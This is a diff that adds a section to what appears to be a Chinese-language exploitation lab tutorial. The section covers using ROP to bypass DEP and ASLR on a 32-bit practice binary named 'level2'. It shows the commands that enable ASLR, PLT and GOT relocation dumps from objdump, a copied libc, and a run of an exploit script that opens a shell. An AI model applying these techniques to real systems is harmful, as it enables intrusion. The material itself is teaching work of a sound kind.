@@ -64,3 +64,52 @@ $ python exp2.py
 [*] Switching to interactive mode
 $ whoami<br>
 [用户名] <br><br>
+  
+### ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护
+$ sudo -s<br>
+$ echo 2 > /proc/sys/kernel/randomize_va_space<br>
+$ cat /proc/sys/kernel/randomize_va_space<br>
+2<br>
+$ exit<br>
+$ objdump -d -j .plt level2 得到<br>
+level2：     文件格式 elf32-i386<br>
+Disassembly of section .plt:<br>
+080482f0 <read@plt-0x10>:<br>
+ 80482f0:	ff 35 04 a0 04 08    	pushl  0x804a004<br>
+ 80482f6:	ff 25 08 a0 04 08    	jmp    *0x804a008<br>
+ 80482fc:	00 00                	add    %al,(%eax)<br>
+	...<br>
+
+08048300 <read@plt>:<br>
+ 8048300:	ff 25 0c a0 04 08    	jmp    *0x804a00c<br>
+ 8048306:	68 00 00 00 00       	push   $0x0<br>
+ 804830b:	e9 e0 ff ff ff       	jmp    80482f0 <_init+0x28><br>
+
+08048310 <__libc_start_main@plt>:<br>
+ 8048310:	ff 25 10 a0 04 08    	jmp    *0x804a010<br>
+ 8048316:	68 08 00 00 00       	push   $0x8<br>
+ 804831b:	e9 d0 ff ff ff       	jmp    80482f0 <_init+0x28><br>
+
+08048320 <write@plt>:<br>
+ 8048320:	ff 25 14 a0 04 08    	jmp    *0x804a014<br>
+ 8048326:	68 10 00 00 00       	push   $0x10<br>
+ 804832b:	e9 c0 ff ff ff       	jmp    80482f0 <_init+0x28><br>
+$ objdump -R level2 得到<br>
+level2：     文件格式 elf32-i386<br>
+
+DYNAMIC RELOCATION RECORDS<br>
+OFFSET   TYPE              VALUE <br>
+08049ffc R_386_GLOB_DAT    __gmon_start__<br>
+0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0<br>
+0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0<br>
+0804a014 R_386_JUMP_SLOT   write@GLIBC_2.0<br>
+
+$ ldd level2<br>
+$ cp /lib32/libc.so.6 libc.so<br>
+$ objdump -d level2 | grep vulnerable_function0804843b <vulnerable_function>:<br>
+ 8048471:	e8 c5 ff ff ff       	call   804843b <vulnerable_function><br>
+$ python exp3.py<br>
+[*].......<br>
+[*] Switching to interactive mode
+$ whoami
+[用户名] <br><br>
